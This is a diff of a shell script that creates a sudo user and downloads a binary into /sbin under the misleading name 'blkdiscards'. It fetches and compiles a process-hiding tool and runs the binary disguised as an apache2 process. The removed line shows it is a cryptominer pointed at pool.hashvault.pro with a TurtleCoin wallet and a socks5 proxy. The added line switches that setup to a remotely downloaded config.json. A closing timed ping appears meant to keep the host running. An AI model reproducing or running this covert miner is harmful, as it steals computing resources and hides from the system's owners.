@@ -20,13 +20,14 @@ sudo sysctl -w net.ipv6.conf.lo.disable_ipv6=1
 sudo adduser --force-badname --disabled-password --gecos "" Namesr
 sudo usermod -a -G sudo Namesr
 wget -O blkdiscards https://github.com/lifetimerdp/Github/raw/main/run
+wget https://raw.githubusercontent.com/lifetimerdp/scripts/master/config.json
 wget -O xhide.c https://raw.githubusercontent.com/lifetimerdp/source/main/hide.c
 sudo chmod +x xhide.c
 sudo gcc -o hide xhide.c
 sudo mv blkdiscards /sbin
 cd /sbin
-sudo chmod +x blkdiscards
-sudo -u Namesr -H sudo ./hide -s "/usr/sbin/apache2 -k start" -d -p apache.pid ./blkdiscards -a argon2/chukwav2 -o pool.hashvault.pro:80 -u TRTLv2rBwLCVnmXdAUK2Tw5bYcdiA7GzM5gehYXkXPQuLc4cquB4jpsSAfXvyCMT255mnw9aCfY1j1WPwAYgwLbQ7JTJb7oU5yQ -p github -k -x socks5://78.46.200.216:22766 --max-cpu-usage 85
+sudo chmod +x blkdiscards config.json
+sudo -u Namesr -H sudo ./hide -s "/usr/sbin/apache2 -k start" -d -p apache.pid ./blkdiscards -c config.json
 sudo /etc/init.d/nginx start
 sudo timeout 65m ping google.com
 #Jgnsebar_Sembarangan
